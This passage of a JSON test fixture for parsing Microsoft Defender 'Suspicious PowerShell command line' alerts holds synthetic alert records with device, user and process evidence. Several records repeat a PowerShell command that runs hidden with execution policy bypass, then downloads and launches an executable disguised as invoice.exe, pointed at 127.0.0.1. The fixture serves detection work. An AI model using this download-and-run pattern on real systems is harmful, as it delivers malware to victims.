+                "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "publisher": "Microsoft Corporation",
+                "sha1": "f64f11028554687a33ba8252c6cdb0e43c31c686",
+                "sha256": "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17",
+                "size": 491520
+              },
+              "mde_device_id": "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+              "odata_type": "#microsoft.graph.security.processEvidence",
+              "parent_process": {
+                "creation_datetime": "2052-10-20T09:51:19.506Z",
+                "id": 5772,
+                "image_file": {
+                  "name": "cmd.exe",
+                  "path": "C:\\Windows\\System32",
+                  "publisher": "Microsoft Corporation",
+                  "size": 323584
+                }
+              },
+              "process": {
+                "command_line": "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'",
+                "creation_datetime": "2052-10-20T09:51:39.499Z",
+                "id": 8224
+              },
+              "remediation_status": "none",
+              "user_account": {
+                "account_name": "ACVSqdkLV-14709",
+                "domain_name": "AzureAD",
+                "user_sid": "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+              },
+              "verdict": "unknown"
+            }
+          ],
+          "first_activity_datetime": "2052-10-20T09:51:39.515Z",
+          "id": "daefa1828b-dd4e-405c-8a3b-aa28596830dd_2",
+          "incident_id": "33",
+          "incident_web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/incidents/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/incidents/23",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          },
+          "last_activity_datetime": "2052-10-20T09:51:41.993Z",
+          "last_update_datetime": "2052-10-20T09:54:07.503Z",
+          "mitre_techniques": [
+            "T1059.001"
+          ],
+          "provider_alert_id": "feb6871d-ca7f-447f-8c7e-da40121645da_2",
+          "recommended_actions": "1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.",
+          "service_source": "microsoftDefenderForCloud",
+          "severity": "medium",
+          "status": "new",
+          "tenant_id": "2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+          "title": "Suspicious PowerShell command line",
+          "web_url": {
+            "domain": "security.microsoft.com",
+            "original": "https://security.microsoft.com/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "path": "/alerts/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1",
+            "query": "tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64",
+            "scheme": "https"
+          }
+        }
+      },
+      "message": "A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+      "process": {
+        "command_line": [
+          "powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\\\test-WDATP-test\\\\invoice.exe');Start-Process 'C:\\\\test-WDATP-test\\\\invoice.exe'"
+        ],
+        "entity_id": [
+          "9s5wrh8Eh5HeemCY7eQhltB0mDk="
+        ],
+        "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "hash": {
+          "sha1": [
+            "f64f11028554687a33ba8252c6cdb0e43c31c686"
+          ],
+          "sha256": [
+            "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+          ]
+        },
+        "name": [
+          "powershell.exe"
+        ],
+        "parent": {
+          "entity_id": [
+            "Oq0hTtP4u47VcG6ZdrgZVFB56As="
+          ],
+          "executable": "C:\\Windows\\System32\\cmd.exe",
+          "pid": [
+            5772
+          ],
+          "start": [
+            "2052-10-20T09:51:19.506Z"
+          ]
+        },
+        "pid": [
+          8224
+        ],
+        "start": [
+          "2052-10-20T09:51:39.499Z"
+        ],
+        "user": {
+          "name": [
+            "ACVSqdkLV-14709"
+          ]
+        }
+      },
+      "related": {
+        "hash": [
+          "f64f11028554687a33ba8252c6cdb0e43c31c686",
+          "f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17"
+        ],
+        "hosts": [
+          "735f41e26eba5899c9cbe8b0bb8e74e32de2a509",
+          "Windows11",
+          "22H2",
+          "clw555test",
+          "AzureAD"
+        ],
+        "ip": [
+          "fe80::cfe4:80b:615c:38fb",
+          "127.0.0.1",
+          "::1"
+        ],
+        "user": [
+          "ACVSqdkLV-14709",
+          "S-1-12-1-1485667349-1150190949-4065799612-2328216759"
+        ]
+      },
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ],
+      "threat": {
+        "tactic": {
+          "name": [
+            "Execution"
+          ]
+        },
+        "technique": {
+          "subtechnique": {
+            "id": [
+              "T1059.001"
+            ]
+          }
+        }
+      },
+      "url": {
+        "original": [
+          "http://127.0.0.1/1.exe"
+        ]
+      },
+      "user": {
+        "domain": [
+          "AzureAD"
+        ],
+        "name": [
+          "ACVSqdkLV-14709"
+        ]
+      }
+    },
+    {
+      "_compat_error": "no result"
+    }
+  ],
+  "input": [
+    {
+      "message": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_1\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_1\",\"incidentId\":\"23\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2051-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2051-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2051-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2051-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2051-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"192.168.72.3\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"127.0.0.1\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2051-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2051-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2051-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_2\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_2\",\"incidentId\":\"33\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForEndpoint\",\"detectionSource\":\"microsoftDefenderForEndpoint\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2052-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2052-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2052-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2052-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"internetMessageId\":\"81ce15$1h8z87@mail01.example.com\",\"networkMessageId\":\"b19dfef8-95a1-427a-b42d-6f3a257884ef\",\"senderIp\": \"203.0.113.138\",\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2052-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"192.168.72.3\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"127.0.0.1\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2052-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2052-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_2\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_2\",\"incidentId\":\"33\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForCloud\",\"detectionSource\":\"microsoftDefenderForCloud\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2052-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2052-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2052-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2052-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"internetMessageId\":\"81ce15$1h8z87@mail01.example.com\",\"networkMessageId\":\"b19dfef8-95a1-427a-b42d-6f3a257884ef\",\"senderIp\": \"203.0.113.138\",\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2052-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"192.168.72.3\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"127.0.0.1\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2052-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2052-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"id\":\"daefa1828b-dd4e-405c-8a3b-aa28596830dd_2\",\"providerAlertId\":\"feb6871d-ca7f-447f-8c7e-da40121645da_2\",\"incidentId\":\"33\",\"status\":\"new\",\"severity\":\"medium\",\"classification\":null,\"determination\":null,\"serviceSource\":\"microsoftDefenderForCloud\",\"detectionSource\":\"microsoftDefenderForCloud\",\"productName\":\"Microsoft Defender for Endpoint\",\"detectorId\":\"0a5a7718-b7ae-46c4-911f-b23302242c62\",\"tenantId\":\"2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"title\":\"Suspicious PowerShell command line\",\"description\":\"A suspicious PowerShell activity was observed on the machine. \\nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.\",\"recommendedActions\":\"1. Examine the PowerShell command line to understand what commands were executed. Note: the content may need to be decoded if it is Base64-encoded.\\n2. Search the script for more indicators to investigate - for example IP addresses (potential C&C servers), target computers etc.\\n3. Explore the timeline of this and other related machines for additional suspect activities around the time of the alert.\\n4. Look for the process that invoked this PowerShell run and their origin. Consider submitting any suspect files in the chain for deep analysis for detailed behavior information.\",\"category\":\"Execution\",\"assignedTo\":null,\"alertWebUrl\":\"https:\\/\\/security.microsoft.com\\/alerts\\/daefa1828b-dd4e-405c-8a3b-aa28596830dd_1?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"incidentWebUrl\":\"https:\\/\\/security.microsoft.com\\/incidents\\/23?tid=2bde388d-8a81-40d3-a25e-0dbc2cacdc64\",\"actorDisplayName\":null,\"threatDisplayName\":null,\"threatFamilyName\":null,\"mitreTechniques\":[\"T1059.001\"],\"createdDateTime\":\"2052-10-20T09:53:09.8839373Z\",\"lastUpdateDateTime\":\"2052-10-20T09:54:07.5033333Z\",\"resolvedDateTime\":null,\"firstActivityDateTime\":\"2052-10-20T09:51:39.5154802Z\",\"lastActivityDateTime\":\"2052-10-20T09:51:41.9939003Z\",\"alertPolicyId\":null,\"additionalData\":null,\"comments\":[],\"evidence\":[{\"internetMessageId\":\"81ce15$1h8z87@mail01.example.com\",\"networkMessageId\":\"b19dfef8-95a1-427a-b42d-6f3a257884ef\",\"senderIp\": \"\",\"@odata.type\":\"#microsoft.graph.security.deviceEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[\"PrimaryDevice\"],\"tags\":[],\"firstSeenDateTime\":\"2052-10-20T09:50:17.7383987Z\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"azureAdDeviceId\":\"b51cc058-a3f4-47f8-8fcd-7c86b56e3c97\",\"deviceDnsName\":\"clw555test\",\"osPlatform\":\"Windows11\",\"osBuild\":22621,\"version\":\"22H2\",\"healthStatus\":\"inactive\",\"riskScore\":\"high\",\"rbacGroupId\":0,\"rbacGroupName\":null,\"onboardingStatus\":\"onboarded\",\"defenderAvStatus\":\"notSupported\",\"ipInterfaces\":[\"\",\"fe80::cfe4:80b:615c:38fb\",\"127.0.0.1\",\"::1\"],\"vmMetadata\":null,\"loggedOnUsers\":[{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\"}]},{\"@odata.type\":\"#microsoft.graph.security.userEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}},{\"@odata.type\":\"#microsoft.graph.security.urlEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"url\":\"http:\\/\\/127.0.0.1\